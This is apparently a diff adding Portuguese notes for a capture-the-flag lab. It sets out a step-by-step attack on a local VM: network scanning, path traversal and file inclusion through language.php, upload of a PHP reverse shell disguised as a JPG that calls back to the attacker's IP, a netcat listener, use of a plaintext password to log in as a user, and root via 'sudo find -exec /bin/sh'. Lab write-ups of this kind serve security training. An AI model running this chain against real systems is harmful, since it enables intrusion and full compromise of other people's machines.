@@ -1,0 +1,77 @@
+1- ip -br -c a 
+
+2- netdiscover -i eth0 -P -r 192.168.56.0/24
+
+3- acessar o site: 192.168.56.101
+
+4- nmap -sV -p- 192.168.56.101
+
+5- clicar 2 vezes no language
+
+6- Colar o caminho "../../../etc/passwd" na URL: "http://192.168.56.101/language.php?lang=../../../etc/passwd"
+
+7- usar o view page source
+
+8- usar o comando: gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/big.txt
+
+9- clicar no link do gobuster
+
+10- acessar: cd /usr/share/webshells/php
+
+11- ls -la
+
+12- cp php-reverse-shell.php revshell.php.jpg
+
+13- ls -la
+
+14- nano revshell.php.jpg
+
+15- trocar o IP 127.0.1 pelo: 192.168.56.103 (ip eth0)
+
+16- fazer o upload da imagem revshell.php.jpg
+
+17- other-computer-usr-share-webshells-php
+
+18- olhar o index e ver se foi feito o upload
+
+19- nc -nlvp 1234 
+
+20- acessar o site com essa URL: http://192.168.56.101/language.php?lang=/uploads/revshell.php.jpg
+
+21- python3 -c "import pty;pty.spawn('/bin/bash')"
+
+22- cd /var/www/
+
+23- ls - cd html
+
+24- ls - cd supersecret-for-aziz
+
+25- ls - cat bassam-pass.txt
+
+26- su bassam - Password123!@#
+
+27- ls - cd /home/bassam
+
+28- ls - cat user.txt
+
+29- flag1 encontrada
+
+30- sudo
+
+31- sudo -l - senha
+
+32- acessar o site:https://gtfobins.github.io/gtfobins/find/ - procurar find
+
+33- find . -exec /bin/sh \; -quit
+
+34- id
+
+35- sudo find . -exec /bin/sh \; -quit
+
+36- cd /root
+
+37- ls - flag.txt
+
+
+
+
